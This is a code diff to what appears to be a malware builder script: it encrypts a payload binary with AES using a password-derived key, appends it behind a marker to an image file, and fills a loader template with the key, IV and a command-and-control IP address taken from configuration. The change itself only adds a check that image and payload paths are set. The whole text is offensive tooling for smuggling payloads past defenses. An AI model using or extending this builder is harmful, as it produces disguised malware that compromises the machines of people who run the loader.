@@ -33,40 +33,42 @@ def main():
     # Patch loader
     with open(loader_path, "r") as f:
         loader_code = f.read()
-    if password:
-        # Read files
-        with open(image_path, "rb") as f:
-            image_data = f.read()
-        with open(binary_path, "rb") as f:
-            binary_data = f.read()
-
-        # Generate key and IV
-        key = sha256(password.encode()).digest()  # 32 bytes
-        iv = get_random_bytes(16)
-
-        # Encrypt binary
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        encrypted = cipher.encrypt(pad(binary_data))
-
-        # Append to image with marker
-        with open(output_path, "wb") as f:
-            f.write(image_data)
-            f.write(config["MARKER"].encode())
-            f.write(iv)
-            f.write(encrypted)
-        
-        print(f"[*] Output image written to: {output_path}")
-        
-        key_c = bytes_to_c_array("key", key)
-        iv_c = bytes_to_c_array("iv", iv)
-
-        loader_code = loader_code.replace("__KEY__", ', '.join(str(b) for b in key))
-        loader_code = loader_code.replace("__IV__", ', '.join(str(b) for b in iv))
-
-    else:
-        loader_code = loader_code.replace("{__KEY__}", '{' + ', '.join(['0'] * 32) + '}')
-        loader_code = loader_code.replace("{__IV__}",  '{' + ', '.join(['0'] * 16) + '}')
-        print(f"[*] Non encrypted payload!")
+    if image_path and binary_path:
+        print(f"[*] Payload {binary_path} will be in the image {image_path}")
+        if password:
+            # Read files
+            with open(image_path, "rb") as f:
+                image_data = f.read()
+            with open(binary_path, "rb") as f:
+                binary_data = f.read()
+    
+            # Generate key and IV
+            key = sha256(password.encode()).digest()  # 32 bytes
+            iv = get_random_bytes(16)
+    
+            # Encrypt binary
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            encrypted = cipher.encrypt(pad(binary_data))
+    
+            # Append to image with marker
+            with open(output_path, "wb") as f:
+                f.write(image_data)
+                f.write(config["MARKER"].encode())
+                f.write(iv)
+                f.write(encrypted)
+            
+            print(f"[*] Output image written to: {output_path}")
+            
+            key_c = bytes_to_c_array("key", key)
+            iv_c = bytes_to_c_array("iv", iv)
+    
+            loader_code = loader_code.replace("__KEY__", ', '.join(str(b) for b in key))
+            loader_code = loader_code.replace("__IV__", ', '.join(str(b) for b in iv))
+    
+        else:
+            loader_code = loader_code.replace("{__KEY__}", '{' + ', '.join(['0'] * 32) + '}')
+            loader_code = loader_code.replace("{__IV__}",  '{' + ', '.join(['0'] * 16) + '}')
+            print(f"[*] Non encrypted payload!")
 
     replacements = {
         "{__C2_IP__}": f'"{config["C2_IP"]}"',
